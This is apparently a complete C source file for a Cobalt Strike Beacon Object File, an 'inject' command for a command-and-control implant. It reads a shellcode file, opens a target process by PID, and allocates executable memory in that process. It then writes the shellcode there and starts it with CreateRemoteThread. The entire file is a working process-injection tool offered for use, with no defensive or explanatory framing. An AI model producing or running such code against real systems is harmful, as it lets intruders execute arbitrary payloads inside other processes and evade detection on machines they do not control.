/*
 * inject <pid> <shellcode_file> - inject raw shellcode into a process.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid = 0;
    char *path;
    int plen = 0;
    HANDLE file, proc;
    LARGE_INTEGER fsize;
    LPVOID local = NULL, remote = NULL;
    DWORD read = 0;
    HANDLE thread;

    if (!args || alen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: inject <pid> <shellcode_file>\n");
        return;
    }

    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);
    path = BeaconDataExtract(&parser, &plen);
    if (!path || pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "invalid arguments\n");
        return;
    }

    file = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    if (!KERNEL32$GetFileSizeEx(file, &fsize) || fsize.QuadPart <= 0 || fsize.QuadPart > (LONGLONG)0x10000000) {
        BeaconPrintf(CALLBACK_ERROR, "invalid or too large shellcode file\n");
        KERNEL32$CloseHandle(file);
        return;
    }

    local = KERNEL32$VirtualAlloc(NULL, (SIZE_T)fsize.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!local) {
        KERNEL32$CloseHandle(file);
        return;
    }

    if (!KERNEL32$ReadFile(file, local, (DWORD)fsize.QuadPart, &read, NULL) || read != (DWORD)fsize.QuadPart) {
        BeaconPrintf(CALLBACK_ERROR, "ReadFile failed\n");
        KERNEL32$VirtualFree(local, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(file);
        return;
    }
    KERNEL32$CloseHandle(file);

    proc = KERNEL32$OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                FALSE, (DWORD)pid);
    if (!proc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n", pid,
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$VirtualFree(local, 0, MEM_RELEASE);
        return;
    }

    remote = KERNEL32$VirtualAllocEx(proc, NULL, (SIZE_T)fsize.QuadPart,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(proc);
        KERNEL32$VirtualFree(local, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$WriteProcessMemory(proc, remote, local, (SIZE_T)fsize.QuadPart, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(proc);
        KERNEL32$VirtualFree(local, 0, MEM_RELEASE);
        return;
    }

    thread = KERNEL32$CreateRemoteThread(proc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (thread) {
        BeaconPrintf(CALLBACK_OUTPUT, "Injected %lu bytes into PID %d\n",
                     (unsigned long)fsize.QuadPart, pid);
        KERNEL32$CloseHandle(thread);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CreateRemoteThread failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(proc);
    KERNEL32$VirtualFree(local, 0, MEM_RELEASE);
}
